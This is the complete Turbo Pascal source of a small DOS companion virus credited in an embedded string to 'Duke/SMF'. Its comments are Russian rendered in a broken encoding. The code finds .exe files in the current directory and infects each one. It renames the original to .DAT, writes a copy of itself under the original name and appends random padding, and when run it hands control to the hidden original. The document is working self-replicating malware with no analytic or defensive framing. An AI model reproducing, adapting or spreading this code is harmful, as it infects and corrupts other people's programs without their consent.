   {$I-,S-}
   {$M 5000, 0, 5000}
   uses dos;
   const Len=4528;                    {¤«¨  ¢¨àãá }
         d='.DAT';
   var b,g:file;
       ds:dirstr;
       ns:namestr;
       es:extstr;
       n:searchrec;
       st:string;
       i:integer;
       v:array[1..Len] of byte;       {â¥«® ¢¨àãá }
   {--------------------------------------------------------------------------}
   procedure Execute;                 {‡ ¯ãáª ¨ «¥ç¥¨¥ ä ©« }
   var par:string;                    {¯ à ¬¥âàë § ¯ãáª }
       s:string;                      {§ ¯ãé¥ë© ä ©«}
   begin
   s:=paramstr(0);
   assign(b,s);reset(b,1);
   blockread(b,v,Len);                {ç¨â ¥¬ ¢¨àãá ¢ ¯ ¬ïâì}
   close(b);
   fsplit(s,ds,ns,es);
   st:=ds+ns+d;
   assign(g,st);
   {$I-}reset(g);{$I+}
   if ioresult=0 then                 {¥á«¨  ©¤¥ ¯®à ¦¥ë© ä ©«...}
     begin
     erase(b);                        {...ã¤ «ï¥¬ ¢¨àãá}
     close(g);
     rename(g,s);                     {...¯¥à¥¨¬¥®¢ë¢ ¥¬ ¦¥àâ¢ã ¢ EXE}
     par:='';                         {...á®åà ï¥¬ ¯ à ¬¥âàë}
     for i:=1 to paramcount do par:=par+' '+paramstr(i);
     exec(s,par);                     {...¨ § ¯ãáª ¥¬ ¦¥àâ¢ã}
     end;
   end;
   {--------------------------------------------------------------------------}
   procedure Infect(n:string);        {*à®æ¥¤ãà  § à ¦¥¨ï ä ©« }
   var ch:byte;
   begin
   fsplit(n,ds,ns,es);
   st:=ds+ns+d;
   assign(g,st);
   {$I-}reset(g,1);{$I+}              {*à®¢¥àï¥¬, ¥áâì «¨ ã¦¥ ä ©«}
                                      {á à áè¨à¥¨¥¬ DAT}
   if ioresult<>0 then                {…á«¨ ¥â => ¥éñ ¥ § à ¦¥...}
     begin
     assign(b,n);
     setfattr(b,$20);
     rename(b,st);                    {... ¯¥à¥¨¬¥®¢ë¢ ¥¬ ¦¥àâ¢ã}
     assign(b,n);
     rewrite(b,1);                    {... á®§¤ ¥¬ ª®¬¯ ì®}
     blockwrite(b,v,Len);             {... ¯¨è¥¬ ¢¨àãá}
     for i:=1 to random(500) do       {... ¯¨è¥¬ ¬ãá®à}
       begin
       ch:=random(250);
       blockwrite(b,ch,1);
       end;
     close(b);                        {§ à ¦¥¨¥ § ¢¥àè¥®}
     end
   else close(g);
   end;
   {-------------------------------------------------------------------------}
   begin
   asm
     jmp @lab
     db 'MiniHLLC (c) by Duke/SMF'
   @lab:
   end;
   Execute;                           {§ ¯ãáª ¦¥àâ¢ë}
   findfirst('*.exe',$21,n);          {¯®¨áª ¯®¤å®¤ïé¥£® ä ©« }
   while doserror=0 do
     begin
     Infect(n.name);                  {¢ë§®¢ § à ¦¥¨ï}
     findnext(n);
     end;
   end.
